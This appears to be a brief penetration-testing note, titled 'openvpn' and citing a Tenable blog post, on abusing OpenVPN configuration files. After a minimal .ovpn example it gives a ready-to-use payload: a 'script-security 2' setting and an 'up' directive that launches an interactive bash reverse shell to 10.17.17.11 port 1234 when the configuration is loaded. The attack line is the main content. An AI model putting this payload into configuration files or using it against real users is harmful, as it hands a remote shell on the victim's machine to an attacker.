# openvpn
[https://medium.com/tenable-techblog/reverse-shell-from-an-openvpn-configuration-file-73fd8b1d38da](https://medium.com/tenable-techblog/reverse-shell-from-an-openvpn-configuration-file-73fd8b1d38da) 

At its most simple form, an ovpn file looks like the this:

> remote 192.168.1.245  
> ifconfig 10.200.0.2 10.200.0.1  
> dev tun

This directs the client to connect to the server at 192.168.1.245 without authentication or encryption and establish the tun interface for communication between the client (10.200.0.2) and the server (10.200.0.1).

```text-plain
script-security 2
up "/bin/bash -c '/bin/bash -i > /dev/tcp/10.17.17.11/1234 0<&1 2>&1&'"
```